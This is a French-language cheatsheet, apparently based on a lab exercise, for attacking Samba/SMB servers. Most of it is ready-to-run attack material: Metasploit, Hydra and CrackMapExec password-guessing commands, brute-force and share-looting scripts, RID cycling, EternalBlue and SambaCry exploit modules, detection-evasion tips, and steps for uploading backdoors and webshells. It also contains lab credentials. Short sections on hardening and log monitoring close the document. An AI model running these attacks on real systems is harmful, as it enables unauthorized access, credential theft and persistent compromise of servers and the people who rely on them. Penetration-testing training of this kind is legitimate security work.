# Samba Recon - Cheatsheet d'Attaque par Dictionnaire

## Vue d'ensemble
Cette cheatsheet couvre les techniques de reconnaissance et d'exploitation des serveurs Samba/SMB, incluant l'√©num√©ration, les attaques par dictionnaire, l'analyse des partages et les techniques d'exploitation avanc√©es.

---

## Phase 1: Reconnaissance et d√©tection

### Test de connectivit√©
```bash
# V√©rification de l'accessibilit√©
ping -c 4 <target>

# Test de connectivit√© NetBIOS
nbtscan <target>
```

### Scan des ports SMB/NetBIOS
```bash
# Ports SMB standards
nmap -p 139,445 <target>

# Scan avec d√©tection de version
nmap -sV -p 139,445 <target>

# Scan complet NetBIOS/SMB
nmap -p 137,138,139,445 -sV -sC <target>

# Scripts NSE sp√©cialis√©s SMB
nmap --script smb* -p 445 <target>
```

### D√©tection de version Samba
```bash
# Banner grabbing SMB
smbclient -L <target> -N

# Avec enum4linux
enum4linux -S <target>

# Version d√©taill√©e avec Metasploit
msfconsole -q
use auxiliary/scanner/smb/smb_version
set RHOSTS <target>
run
```

---

## Phase 2: √ânum√©ration des partages

### √ânum√©ration anonyme
```bash
# Liste des partages sans authentification
smbclient -L <target> -N

# Avec smbmap
smbmap -H <target>

# Connexion anonyme (null session)
smbclient -L <target> -U ""
rpcclient -U "" <target>
```

### Scripts Nmap pour √©num√©ration
```bash
# √ânum√©ration compl√®te SMB
nmap --script smb-enum-shares,smb-enum-users,smb-enum-domains,smb-enum-groups,smb-enum-services -p 445 <target>

# Test de vuln√©rabilit√©s
nmap --script smb-vuln* -p 445 <target>

# √ânum√©ration sp√©cifique
nmap --script smb-enum-shares -p 445 <target>
nmap --script smb-enum-users -p 445 <target>
```

### Avec enum4linux
```bash
# √ânum√©ration basique
enum4linux <target>

# √ânum√©ration compl√®te
enum4linux -a <target>

# √ânum√©ration avec credentials
enum4linux -u "username" -p "password" -a <target>

# √ânum√©ration sp√©cifique des partages
enum4linux -S <target>
```

---

## Phase 3: Attaques par dictionnaire

### Avec Metasploit (M√©thode du lab)

#### Configuration pour utilisateur sp√©cifique
```bash
# Comme dans le lab - utilisateur jane
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS <target>
exploit
```

#### Configuration pour attaque compl√®te
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <target>
set USER_FILE /usr/share/wordlists/metasploit/common_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set STOP_ON_SUCCESS false  # Pour trouver tous les comptes
set VERBOSE true
run
```

#### Tests avec diff√©rentes wordlists
```bash
# Wordlists Metasploit
set PASS_FILE /usr/share/wordlists/metasploit/common_passwords.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set PASS_FILE /usr/share/wordlists/metasploit/passwords.lst

# Utilisateurs courants
set USER_FILE /usr/share/wordlists/metasploit/common_users.txt
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
```

### Avec Hydra (M√©thode du lab)

#### Pr√©paration de RockYou
```bash
# D√©compression de rockyou (comme dans le lab)
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

#### Attaques Hydra
```bash
# Utilisateur sp√©cifique avec RockYou (comme dans le lab)
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> smb

# Wordlists multiples
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/rockyou.txt <target> smb

# Avec limitations de performance
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> smb -t 4 -w 30

# Port personnalis√©
hydra -l admin -P passwords.txt <target> -s 445 smb
```

### Avec CrackMapExec
```bash
# Installation si n√©cessaire
apt-get install crackmapexec

# Utilisateur unique
crackmapexec smb <target> -u admin -p /usr/share/wordlists/rockyou.txt

# Wordlists multiples
crackmapexec smb <target> -u /usr/share/wordlists/metasploit/common_users.txt -p /usr/share/wordlists/metasploit/unix_passwords.txt

# Avec options avanc√©es
crackmapexec smb <target> -u admin -p passwords.txt --shares --continue-on-success
```

### Avec smbclient en script
```bash
#!/bin/bash
# smb_bruteforce.sh

TARGET=$1
USER=$2
PASSLIST=$3

while IFS= read -r password; do
    echo "Testing: $USER:$password"
    smbclient -L $TARGET -U "$USER%$password" -W WORKGROUP 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[SUCCESS] $USER:$password"
        break
    fi
done < "$PASSLIST"
```

---

## Phase 4: Analyse des partages et permissions

### Avec smbmap (M√©thode du lab)

#### Analyse des permissions
```bash
# Avec credentials trouv√©s (comme dans le lab avec admin:password1)
smbmap -H <target> -u admin -p password1

# Analyse d√©taill√©e
smbmap -H <target> -u admin -p password1 -R

# Test d'√©criture
smbmap -H <target> -u admin -p password1 --upload test.txt 'share_name/test.txt'

# Avec domaine
smbmap -H <target> -u admin -p password1 -d DOMAIN
```

#### Options avanc√©es smbmap
```bash
# Recherche de fichiers sp√©cifiques
smbmap -H <target> -u admin -p password1 -R --depth 5 -A '*.txt'
smbmap -H <target> -u admin -p password1 -R -q -A '*.conf'

# Ex√©cution de commandes
smbmap -H <target> -u admin -p password1 -x 'whoami'
```

### Avec smbclient

#### Test de navigabilit√© (comme dans le lab)
```bash
# Liste des partages
smbclient -L <target> -U jane
# Password: abc123

# Test d'acc√®s √† un partage sp√©cifique
smbclient //<target>/jane -U jane
# Password: abc123

# Navigation dans les partages
smbclient //<target>/admin -U admin
# Password: password1
```

#### Commandes smbclient essentielles
```bash
# Dans une session smbclient
ls                     # Lister les fichiers
cd directory           # Changer de r√©pertoire
get filename           # T√©l√©charger un fichier
mget *.txt            # T√©l√©charger plusieurs fichiers
put filename          # Uploader un fichier
mkdir newdir          # Cr√©er un r√©pertoire
rmdir directory       # Supprimer un r√©pertoire
del filename          # Supprimer un fichier
```

---

## Phase 5: Exploitation avanc√©e et collecte de donn√©es

### Collecte de flags/donn√©es (M√©thode du lab)

#### Navigation et extraction
```bash
# Connexion au partage admin (comme dans le lab)
smbclient //<target>/admin -U admin
# Password: password1

# Navigation et t√©l√©chargement
ls
cd hidden
ls
get flag.tar.gz
exit

# Extraction locale
tar -xf flag.tar.gz
cat flag
```

#### Script automatis√© pour collecte
```bash
#!/bin/bash
# smb_collector.sh

TARGET=$1
CREDS_FILE=$2  # Format: username:password

while IFS=':' read -r username password; do
    echo "[*] Collecting from $username"
    
    # Cr√©er r√©pertoire pour l'utilisateur
    mkdir -p "smb_loot_$username"
    
    # Liste des partages accessibles
    smbclient -L $TARGET -U "$username%$password" -W WORKGROUP 2>/dev/null | grep "Disk" | awk '{print $1}' > shares_$username.txt
    
    # T√©l√©charger depuis chaque partage
    while IFS= read -r share; do
        echo "[+] Accessing share: $share"
        smbclient //$TARGET/$share -U "$username%$password" -c "prompt OFF; recurse ON; mget *" 2>/dev/null
        mv * "smb_loot_$username/" 2>/dev/null
    done < shares_$username.txt
    
done < "$CREDS_FILE"

# Recherche de flags
find smb_loot_*/ -type f -exec grep -l "flag\|{.*}" {} \; 2>/dev/null
```

---

## Phase 6: √ânum√©ration des Named Pipes (M√©thode du lab)

### Avec Metasploit pipe_auditor
```bash
# Configuration comme dans le lab
msfconsole -q
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS <target>
exploit
```

### √ânum√©ration manuelle des pipes
```bash
# Avec smbclient
smbclient //<target>/IPC$ -U admin
# Dans la session:
help

# Avec rpcclient
rpcclient -U admin <target>
# Dans la session:
help
enumdomains
enumdomusers
```

### Named Pipes communes √† rechercher
```
netlogon       # Authentification domaine
lsarpc         # Local Security Authority
samr           # Security Account Manager
eventlog       # Logs d'√©v√©nements
InitShutdown   # Contr√¥le syst√®me
ntsvcs         # Services NT
srvsvc         # Services serveur
wkssvc         # Services workstation
winreg         # Registre Windows
spoolss        # Service d'impression
```

---

## Phase 7: RID Cycling et √©num√©ration utilisateurs (M√©thode du lab)

### Avec enum4linux
```bash
# RID Cycling comme dans le lab
enum4linux -r -u "admin" -p "password1" <target>

# √ânum√©ration compl√®te des utilisateurs
enum4linux -U -u "admin" -p "password1" <target>

# √ânum√©ration des groupes
enum4linux -G -u "admin" -p "password1" <target>

# Information sur un utilisateur sp√©cifique
enum4linux -u "admin" -p "password1" -U <target> | grep "jane\|nancy\|shawn\|admin"
```

### Avec rpcclient
```bash
# Connexion
rpcclient -U admin <target>

# √ânum√©ration des utilisateurs
enumdomusers
enumdomgroups

# Information sur un utilisateur par RID
queryuser 1000
queryuser 1001
queryuser 1002
queryuser 1003

# Conversion RID vers nom
lookuprids 1000 1001 1002 1003
```

### SID Format typique
```
Format: S-1-22-1-XXXX
Exemples du lab:
shawn: S-1-22-1-1000
jane:  S-1-22-1-1001  
nancy: S-1-22-1-1002
admin: S-1-22-1-1003
```

---

## Phase 8: Vuln√©rabilit√©s Samba sp√©cifiques

### Tests de vuln√©rabilit√©s communes
```bash
# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 <target>

# CVE-2017-7494 (SambaCry)
nmap --script smb-vuln-cve-2017-7494 -p 445 <target>

# Autres vuln√©rabilit√©s
nmap --script smb-vuln* -p 445 <target>
```

### Exploitation avec Metasploit
```bash
# MS17-010 EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
exploit

# SambaCry
use exploit/linux/samba/is_known_pipename
set RHOSTS <target>
exploit
```

---

## Phase 9: Techniques d'√©vasion et persistance

### Contournement de d√©tection
```bash
# Hydra avec d√©lais
hydra -l admin -P passwords.txt <target> smb -W 5 -t 1

# CrackMapExec avec options furtives
crackmapexec smb <target> -u admin -p passwords.txt --delay 2
```

### Persistance via partages
```bash
# Upload de backdoors
smbclient //<target>/writable_share -U admin
put backdoor.exe malware.exe
put webshell.php shell.php

# Modification de fichiers de configuration
get smb.conf
# Modifier localement puis re-upload
put smb.conf
```

---

## Phase 10: Outils et scripts automatis√©s

### Script Python pour exploitation compl√®te
```python
#!/usr/bin/env python3
import subprocess
import sys
import os
from impacket.smbconnection import SMBConnection
from impacket import smb

class SambaExploiter:
    def __init__(self, target):
        self.target = target
        self.valid_creds = []
        
    def brute_force_smb(self, userlist, passlist):
        for username in userlist:
            for password in passlist:
                try:
                    conn = SMBConnection(self.target, self.target)
                    conn.login(username, password)
                    print(f"[SUCCESS] {username}:{password}")
                    self.valid_creds.append((username, password))
                    conn.close()
                except:
                    pass
    
    def enumerate_shares(self, username, password):
        try:
            conn = SMBConnection(self.target, self.target)
            conn.login(username, password)
            
            shares = conn.listShares()
            for share in shares:
                share_name = share['shi1_netname'][:-1]
                print(f"Share: {share_name}")
                
                try:
                    files = conn.listPath(share_name, '/')
                    for file in files:
                        print(f"  File: {file.get_longname()}")
                except:
                    pass
                    
            conn.close()
        except Exception as e:
            print(f"Error: {e}")

# Utilisation
exploiter = SambaExploiter(sys.argv[1])
```

### Script Bash pour √©num√©ration compl√®te
```bash
#!/bin/bash
# samba_full_recon.sh

TARGET=$1
USERLIST="admin jane nancy shawn guest"
PASSLIST="/usr/share/wordlists/metasploit/unix_passwords.txt"

echo "[*] Starting Samba reconnaissance on $TARGET"

# Phase 1: Port scanning
echo "[+] Scanning SMB ports..."
nmap -p 139,445 -sV $TARGET

# Phase 2: Anonymous enumeration
echo "[+] Testing anonymous access..."
smbclient -L $TARGET -N
enum4linux -S $TARGET

# Phase 3: Brute force attack
echo "[+] Starting brute force..."
for user in $USERLIST; do
    echo "Testing user: $user"
    hydra -l $user -P $PASSLIST $TARGET smb -t 4 -f
done

# Phase 4: Enumeration with found credentials
echo "[+] Enumerating with valid credentials..."
if [ -f "found_creds.txt" ]; then
    while IFS=':' read -r user pass; do
        echo "Enumerating with $user:$pass"
        smbmap -H $TARGET -u $user -p $pass
        enum4linux -u $user -p $pass -a $TARGET
    done < found_creds.txt
fi
```

---

## Phase 11: Wordlists et dictionnaires

### Wordlists du lab
```bash
# Metasploit (utilis√©es dans le lab)
/usr/share/wordlists/metasploit/unix_passwords.txt
/usr/share/wordlists/metasploit/common_users.txt
/usr/share/wordlists/metasploit/common_passwords.txt

# RockYou (utilis√©e dans le lab)
/usr/share/wordlists/rockyou.txt  # Apr√®s d√©compression
```

### Wordlists suppl√©mentaires
```bash
# SecLists
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
/usr/share/seclists/Passwords/darkweb2017-top1000.txt

# Utilisateurs SMB courants
admin, administrator, guest, user, test, demo, service, backup, root
jane, nancy, shawn  # Du lab

# Mots de passe SMB courants  
password, admin, 123456, password123, admin123, letmein, welcome
abc123, password1  # Du lab
```

---

## Phase 12: D√©tection et contre-mesures

### Configuration s√©curis√©e Samba
```bash
# √âditer /etc/samba/smb.conf

[global]
# S√©curisation g√©n√©rale
security = user
encrypt passwords = yes
min protocol = SMB2
max protocol = SMB3

# Restriction d'acc√®s
hosts allow = 192.168.1.0/24
hosts deny = ALL
invalid users = root, admin
max connections = 10

# Logging
log level = 2
log file = /var/log/samba/log.%m
max log size = 1000

# Protection contre brute force
account lockout threshold = 3
account lockout duration = 30
```

### Surveillance et d√©tection
```bash
# Logs Samba
tail -f /var/log/samba/log.smbd
tail -f /var/log/samba/log.nmbd

# D√©tection d'attaques par force brute
grep "authentication failure" /var/log/samba/log.*
grep "failed login" /var/log/samba/log.*

# Avec Fail2Ban
# Configuration dans /etc/fail2ban/jail.local
[samba]
enabled = true
port = 139,445
filter = samba
logpath = /var/log/samba/log.%m
maxretry = 3
bantime = 600
```

---

## Checklist d'exploitation

### Phase de reconnaissance
- [ ] Test de connectivit√©
- [ ] Scan des ports SMB (139, 445)
- [ ] D√©tection de version Samba
- [ ] Test d'acc√®s anonyme
- [ ] √ânum√©ration initiale des partages

### Phase d'√©num√©ration
- [ ] Scripts Nmap SMB
- [ ] enum4linux basique
- [ ] Test de vuln√©rabilit√©s connues
- [ ] √ânum√©ration des services

### Phase d'attaque par dictionnaire
- [ ] Pr√©paration des wordlists
- [ ] Attaque Metasploit smb_login
- [ ] Attaque Hydra avec RockYou
- [ ] Validation des credentials
- [ ] Documentation des acc√®s trouv√©s

### Phase d'analyse des partages
- [ ] Analyse des permissions avec smbmap
- [ ] Test de navigabilit√© des partages
- [ ] Collecte de fichiers sensibles
- [ ] Recherche de flags/donn√©es

### Phase d'√©num√©ration avanc√©e
- [ ] Audit des Named Pipes
- [ ] RID Cycling avec enum4linux
- [ ] √ânum√©ration des utilisateurs/groupes
- [ ] Collecte des SID

---

## R√©sultats attendus (bas√©s sur le lab)

### Credentials trouv√©s:
```
jane:abc123        # Via Metasploit smb_login
admin:password1    # Via Hydra avec RockYou
```

### Analyse des partages:
```
nancy: Read Only   # D√©couvert avec smbmap
jane: Non browseable # Existe mais invisible dans les listes
admin: Writable    # Contient le flag
```

### Named Pipes identifi√©s:
```
netlogon, lsarpc, samr, eventlog, InitShutdown, 
ntsvcs, srvsvc, wkssvc
```

### SID des utilisateurs:
```
shawn: S-1-22-1-1000
jane:  S-1-22-1-1001
nancy: S-1-22-1-1002
admin: S-1-22-1-1003
```



## Notes importantes

‚ö†Ô∏è **L√©gal:** N'utilisez ces techniques que sur des syst√®mes autoris√©s.

üîß **Performance:** Limitez les threads lors des attaques par force brute.

üîç **Collecte:** Explorez tous les partages accessibles syst√©matiquement.

üõ°Ô∏è **D√©fense:** Impl√©mentez des restrictions d'acc√®s et du monitoring.

üìä **Outils:** Combineu Metasploit, Hydra et smbmap pour une approche compl√®te.